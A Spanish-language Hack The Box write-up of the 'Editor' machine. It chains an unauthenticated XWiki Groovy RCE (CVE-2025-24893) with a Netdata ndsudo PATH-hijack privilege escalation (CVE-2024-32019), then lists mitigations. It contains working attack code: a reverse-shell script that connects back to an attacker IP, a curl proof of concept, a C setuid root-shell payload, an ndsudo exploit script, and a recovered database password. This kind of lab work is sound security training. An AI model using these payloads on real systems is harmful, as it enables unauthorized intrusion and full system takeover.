---
tags:
  - CVE-2025-24893
  - CVE-2024-32019
  - xwiki
  - jetty
  - Nmap
  - Path_Hijacking
  - SUID
---

# **Introducción**

La máquina “Editor” presenta un entorno corporativo simulado donde convergen servicios web y herramientas de monitorización. La superficie de ataque inicial está compuesta únicamente por tres servicios expuestos: **SSH**, **nginx** y un servidor **Jetty** que aloja una instancia de **XWiki**. Durante la enumeración del servicio web se identifica una versión vulnerable de XWiki afectada por una vulnerabilidad crítica de ejecución remota sin autenticación (**CVE-2025-24893**), lo que permite comprometer la máquina de manera directa.  
Posteriormente, una vez obtenidas credenciales internas desde la propia instancia comprometida, se accede por SSH al sistema como usuario legítimo. Dentro del entorno local se descubre un binario con permisos **SUID**, `ndsudo`, perteneciente a Netdata y vulnerable a **CVE-2024-32019**, permitiendo la escalada de privilegios mediante un ataque de **PATH Hijacking** que deriva en una shell como **root**.

# Reconocimiento

Para iniciar el proceso de enumeración realizamos un escaneo de puertos completo con **Nmap**, con el objetivo de identificar los servicios expuestos por la máquina víctima.

```bash
Nmap 7.95 scan initiated Tue Nov 18 22:16:13 2025 as: /usr/lib/nmap/nmap --privileged -p- -Pn --min-rate 5000 -oN escaneo 10.10.11.80
Nmap scan report for 10.10.11.80
Host is up (0.096s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

El resultado revela únicamente tres puertos abiertos: **22 (SSH)**, **80 (HTTP)** y **8080 (HTTP-Proxy)**. Esto sugiere que la superficie de ataque inicial se centrará en servicios web.

---

A continuación, realizamos un escaneo más profundo sobre los puertos previamente identificados, utilizando detección de servicios, versiones y scripts de enumeración:

```bash
Nmap 7.95 scan initiated Tue Nov 18 22:17:28 2025 as: /usr/lib/nmap/nmap --privileged -p22,80,8080 --script=http-enum -sC -sV -O --min-rate 5000 -oN puertos 10.10.11.80
Nmap scan report for 10.10.11.80
Host is up (0.090s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
|_http-server-header: Jetty(10.0.20)
| http-enum: 
|_  /robots.txt: Robots file
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Los servicios detectados son:

- **SSH** → OpenSSH 8.9p1
- **HTTP** → nginx 1.18.0
- **HTTP (Jetty)** → Jetty 10.0.20

Dada la presencia de Jetty en el puerto 8080, existe la posibilidad de que la máquina esté ejecutando alguna aplicación Java, posiblemente un panel o aplicación administrativa.

---
## **Enumeración Web**

Accediendo al servicio web alojado en el puerto **8080**, se presenta una interfaz simple sin demasiada información útil. Sin embargo, se observa la existencia de un subdominio llamado **`wiki`**, lo cual podría ser significativo si está asociado a un servicio como XWiki o un sistema de documentación que pueda ser vulnerable.

<img width="1466" height="732" alt="Image" src="https://github.com/user-attachments/assets/4cf2b876-7270-433a-8d7d-009bd948f884" />


Para determinar si existían más subdominios relacionados con el dominio principal `editor.htb`, realizamos fuzzing de subdominios utilizando **ffuf**:

```bash
┌──(zikuta㉿kali)-[~/Desktop/hackthebox/editor]
└─$ ffuf -u http://editor.htb -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host:FUZZ.editor.htb" -fs 154
```

<img width="1624" height="556" alt="Image" src="https://github.com/user-attachments/assets/0bf941e4-2370-4aba-a2d1-04ca49408ff3" />


El escaneo devuelve únicamente el subdominio existente:

- **wiki.editor.htb**

Esto confirma que el subdominio `wiki` es el único disponible, por lo que será el siguiente punto natural de análisis.

---

## **Enumeración del Subdominio – XWiki**

Al acceder al subdominio identificado previamente (`wiki.editor.htb`), se presenta una instancia de **XWiki**. De inmediato, revisé la información de la instalación y encontré un dato crítico:

<img width="1332" height="396" alt="Image" src="https://github.com/user-attachments/assets/dcd84207-4967-427b-aa66-9f7b0a1d3a04" />


La instancia está corriendo **XWiki versión 15.10.8**, una versión vulnerable a un fallo grave de **ejecución remota de código sin autenticación (RCE)**. `CVE-2025-24893 `

# CVE-2025-24893 – Unauthenticated Remote Code Execution in XWiki via SolrSearch Macro

La vulnerabilidad **CVE-2025-24893** permite a un atacante no autenticado ejecutar código Groovy de forma remota en el servidor mediante la macro **SolrSearch**. Esta macro procesa entradas del usuario y las evalúa directamente en un contexto Groovy, lo que abre la puerta a ejecución arbitraria.

### Contexto de la Vulnerabilidad

**XWiki** es una plataforma wiki empresarial de código abierto que utiliza:

- **Groovy** → lenguaje de scripting incrustado
- **Solr** → motor de búsqueda
- **Macros** → bloques reutilizables de lógica que expanden la funcionalidad del wiki

### Componente Vulnerable

**Macro SolrSearch** (`Main.SolrSearchMacros`)

- Propósito: Búsqueda de texto completo mediante Solr
- Ubicación: `/xwiki/bin/view/Main/SolrSearchMacros`

### Análisis del Código

El problema principal está en la **evaluación no segura** de código Groovy:

```groovy
// CÓDIGO VULNERABLE
def query = "search=${params.search}"  // Input directo sin sanitizar
def result = evaluate(query)           // Ejecución peligrosa
```

**Problemas identificados:**

1. **Falta de sanitización** del parámetro `search`
2. **Uso de `evaluate()`** con entrada del usuario
3. **Ausencia de restricciones** de seguridad

### Vector de Ataque

**Endpoint vulnerable:**

```text
GET /xwiki/bin/view/Main/SolrSearchMacros?search=PAYLOAD_GROOVY
```

**Condiciones de explotación:**

-  No requiere autenticación (guest access suficiente)
-  Instancia XWiki expuesta públicamente
-  Versión afectada (pre-15.10.11, 16.4.1, 16.5.0RC1)
-  Macro SolrSearch disponible

### Prueba de Concepto (PoC)

**Ejemplo básico:**

```bash
curl "http://target/xwiki/bin/view/Main/SolrSearchMacros?search=groovy:java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')"
```

**Estructura del payload:**

```bash
groovy:[CÓDIGO_GROOVY_ARBITRARIO]
```

# **Explotación – Reverse Shell**

Para automatizar la explotación de la RCE conseguí un pequeño script en Bash que:

1. Prepara un payload Groovy que ejecuta un comando remoto.
2. Codifica una reverse shell en Base64.
3. Construye el payload final para SolrSearch.
4. Lo envía mediante `curl`.


```bash
RHOST="editor.htb:8080"
LHOST="10.10.15.237"
LPORT=4444

SHELL="bash -c 'bash -i >& /dev/tcp/10.10.15.237/4444 0>&1'"

B64=$(echo -n "$SHELL" | base64 -w0)

RAW='}}}{{async async=false}}{{groovy}}"bash -c {echo,'$B64'}|{base64,-d}|{bash,-i}".execute(){{/groovy}}{{/async}}'

PAYLOAD=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$RAW")

curl "http://$RHOST/xwiki/bin/get/Main/SolrSearch?media=rss&text=${PAYLOAD}"
```

Este sera el codigo que nos otorgara ejecucion remota de comandos, simplemente le damos permisos de ejecucion con `chmod` lo ejecutamos y nos ponemos en escucha por el puerto `4444`


# **Post-Explotación – Credenciales en Configuración**

XWiki utiliza Hibernate para conectarse a la base de datos. Las credenciales se almacenan en **`/etc/xwiki/hibernate.cfg.xml`**, por lo que busqué dicho archivo desde la shell:

<img width="1765" height="620" alt="Image" src="https://github.com/user-attachments/assets/14fac79c-a3d3-4d38-bb13-86063684b43d" />

El archivo devolvió varias líneas, pero una de ellas contenía la contraseña legítima:

	theEd1t0rTeam99

Y en el sistema enumeramos a un usuario llamado `oliver`, así que teniendo en cuenta que conocemos la existencia de ese usuario y que se esta usando el servicio `OpenSSH`, procederemos a intentar conectarnos de forma legitima con las credenciales que nos encontramos.


# **Escalada de Privilegios – Abuso del binario SUID `ndsudo` (CVE-2024-32019)**

Una vez dentro de la máquina con acceso legítimo mediante SSH, procedí a realizar una enumeración local estándar en busca de binarios con el bit **SUID** activado. Esto es importante, ya que cualquier binario ejecutado con SUID root puede potencialmente utilizarse para elevar privilegios.

```bash
oliver@editor:/$ find / -perm -4000 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

	/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo

Este binario pertenece a **Netdata**, un agente de monitorización. Investigando más a fondo, descubrí que `ndsudo` es vulnerable a **CVE-2024-32019**, una vulnerabilidad crítica de escalada de privilegios.

# **CVE-2024-32019 – Netdata `ndsudo` Privilege Escalation (SUID + PATH Hijacking)**

El binario `ndsudo` está diseñado para permitir que ciertos usuarios ejecuten comandos limitados como root. Sin embargo, debido a un fallo de diseño, el binario restringe solo _el nombre_ del comando, pero **resuelve la ruta del ejecutable usando la variable de entorno PATH del usuario**.

Esto significa que, si colocamos un archivo malicioso con un nombre permitido (por ejemplo, `nvme` o `nvme-list`) en un directorio que esté **antes** en el PATH, `ndsudo` lo ejecutará **como root**.

---
### **Requisitos cumplidos por la máquina:**

- El binario `ndsudo` tiene SUID root.
- Netdata es vulnerable (versión afectada).
- El usuario puede controlar el PATH.
- Existen comandos permitidos como `nvme-list` que podemos suplantar.

---

# **Preparación del Payload**

Para aprovechar la vulnerabilidad, compilé un pequeño payload en C con el objetivo de obtener una shell como root:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

## Compilación

```bash
gcc -static payload.c -o nvme -Wall -Werror -Wpedantic
```


Para llevar a cabo la **escalada de privilegios**, primero serví desde mi máquina atacante el binario **`nvme`** ya compilado utilizando un servidor web simple en Python.

<img width="757" height="183" alt="Image" src="https://github.com/user-attachments/assets/eaf3e851-26ee-4d04-925f-10a3c8026e1f" />


 Luego, desde la máquina víctima descargué el binario junto con el script de explotación correspondiente:
 

```bash
#!/bin/bash

# Search for ndsudo SUID
ndsudo_path=$(find / -type f -name "ndsudo" -perm -4000 -print 2>/dev/null)

# Check it was found
if [ -z "$ndsudo_path" ]; then
    echo "[!] No SUID binary named ndsudo was found."
    exit 1
fi

echo "[+] ndsudo found at: $ndsudo_path"

# Check existence of ./nvme payload
if [ -f "./nvme" ]; then
    echo "[+] File 'nvme' found in the current directory."
    chmod +x ./nvme
    echo "[+] Execution permissions granted to ./nvme"
else
    echo "[!] The file 'nvme' was not found in the current directory."
    exit 1
fi

# Modify PATH and execute the SUID binary with nvme-list
echo "[+] Running ndsudo with modified PATH:"
PATH="$(pwd):$PATH" "$ndsudo_path" nvme-list
```

Este script aprovecha la vulnerabilidad **CVE-2024-32019**, la cual afecta al binario `ndsudo` utilizado por Netdata. El exploit funciona colocando un binario malicioso (`nvme`) en el `PATH`, de forma que cuando `ndsudo` lo invoque, en realidad ejecute nuestro payload.

El script:

1. Localiza `ndsudo`
2. Verifica que `nvme` (nuestro payload) esté presente
3. Modifica PATH para que el directorio actual esté **primero**
4. Ejecuta `ndsudo nvme-list`
5. Netdata intenta ejecutar `nvme-list`, pero al buscar en PATH encuentra **nuestro payload** → ejecución como **root**


Una vez descargados ambos archivos, asigné permisos de ejecución al script y lo ejecute

<img width="1484" height="184" alt="Image" src="https://github.com/user-attachments/assets/6b78e461-d076-4cad-93f4-d81888babc19" />

El exploit funcionó correctamente, obteniendo una shell como **root**:

# Flujo de ataque

```java
                    ┌──────────────────────────────────┐
                    │     1. Reconocimiento (Nmap)      │
                    │  Puertos abiertos: 22, 80, 8080   │
                    └──────────────────────────────────┘
                                   │
                                   ▼
                    ┌──────────────────────────────────┐
                    │ 2. Enumeración Web               │
                    │ Descubrimiento del subdominio    │
                    │ wiki.editor.htb                  │
                    └──────────────────────────────────┘
                                   │
                                   ▼
                    ┌──────────────────────────────────┐
                    │ 3. XWiki 15.10.8 vulnerable      │
                    │ CVE-2025-24893 (RCE sin auth)    │
                    └──────────────────────────────────┘
                                   │
                                   ▼
                    ┌──────────────────────────────────┐
                    │ 4. Ejecución Remota de Comandos  │
                    │ Reverse shell desde SolrSearch   │
                    └──────────────────────────────────┘
                                   │
                                   ▼
                    ┌──────────────────────────────────┐
                    │ 5. Post-Explotación:             │
                    │ Credenciales DB en               │
                    │ /etc/xwiki/hibernate.cfg.xml     │
                    │ → Contraseña encontrada           │
                    └──────────────────────────────────┘
                                   │
                                   ▼
                    ┌──────────────────────────────────┐
                    │ 6. Acceso por SSH como “oliver”  │
                    └──────────────────────────────────┘
                                   │
                                   ▼
                    ┌──────────────────────────────────┐
                    │ 7. Enumeración local             │
                    │ ndsudo SUID vulnerable           │
                    │ CVE-2024-32019                   │
                    └──────────────────────────────────┘
                                   │
                                   ▼
                    ┌──────────────────────────────────┐
                    │ 8. PATH Hijacking → Ejecución    │
                    │ de payload “nvme” como root       │
                    └──────────────────────────────────┘
                                   │
                                   ▼
                    ┌──────────────────────────────────┐
                    │      9. Root en la máquina       │
                    └──────────────────────────────────┘

```

# **Conclusión**

La máquina “Editor” permite demostrar dos vectores importantes en un entorno real:

1. **El impacto de un servicio web desactualizado** (XWiki 15.10.8) expuesto en Internet, que permite la ejecución remota sin autenticación mediante una macro vulnerable del motor SolrSearch.
2. **El riesgo de binarios SUID mal diseñados**, especialmente aquellos que confían en variables de entorno controlables por el usuario, como el caso de `ndsudo` vulnerable a **CVE-2024-32019**.

La explotación encadena ambas vulnerabilidades para obtener un compromiso total del sistema, desde acceso remoto inicial hasta escalada de privilegios. El flujo de ataque demuestra cómo malas prácticas de configuración y mantenimiento pueden conducir al control completo de una infraestructura.


# **Mitigaciones**

## **1. Actualización de XWiki**

- Actualizar **XWiki a 15.10.11** o versiones superiores:
    - 16.4.1
    - 16.5.0RC1
- Deshabilitar temporalmente la macro **SolrSearch** si no se utiliza.
- Restringir acceso público al panel `/xwiki/bin/`.

## **2. Configuración Segura**

- Aplicar **control de acceso**, evitando acceso de invitados (_guest access_) en instancias XWiki públicas.
- Deshabilitar ejecución de scripts Groovy desde macros cuando no es estrictamente necesario.

## **3. Protección contra SUID Vulnerables**

- Eliminar o corregir `ndsudo` afectado:
    - Actualizar a una versión de Netdata donde `ndsudo` haya sido parcheado.
- Evitar SUID innecesarios.
- Implementar **fs.protected_symlinks/hardlinks** y **secure_path** en sudoers.


## **Restricciones del PATH**

- Configurar:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
```

- Evitar que aplicaciones privilegiadas respeten el PATH del usuario.

## **5. Seguridad del sistema**

- Auditar binarios SUID con herramientas como:
    
    - `linpeas.sh`
    - `Pspy`
- Rotar periódicamente contraseñas de servicios y bases de datos.
- Aplicar hardening general del sistema (AppArmor/SELinux).


